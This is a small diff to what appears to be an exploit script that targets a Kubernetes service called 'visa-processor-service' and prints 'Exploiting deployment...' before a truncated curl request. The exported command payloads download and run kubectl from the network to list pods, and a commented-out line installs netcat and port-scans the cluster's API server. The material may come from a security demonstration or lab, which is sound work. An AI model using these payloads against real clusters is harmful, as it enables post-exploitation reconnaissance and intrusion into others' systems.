@@ -6,7 +6,7 @@ export svc='visa-processor-service'
 export port='8080'
 #export command='apt update; /usr/bin/apt-get -y install netcat; echo "Running Portscan: kubernetes.default.svc"; nc -zvn $(getent hosts kubernetes.default.svc| cut -f 1 -d" ")  443'
 
-export command='curl -L -o /tmp/kubectl https://dl.k8s.io/release/v1.27.2/bin/linux/amd64/kubectl && chmod +x /tmp/kubectl && /tmp/kubectl get pods && /tmp/kubectl get pods'
+export command='curl -L -o /tmp/kubectl https://dl.k8s.io/release/v1.27.2/bin/linux/amd64/kubectl && chmod +x /tmp/kubectl && /tmp/kubectl get pods'
 
 echo "Exploiting deployment..."
 curl -i -v -s -k \
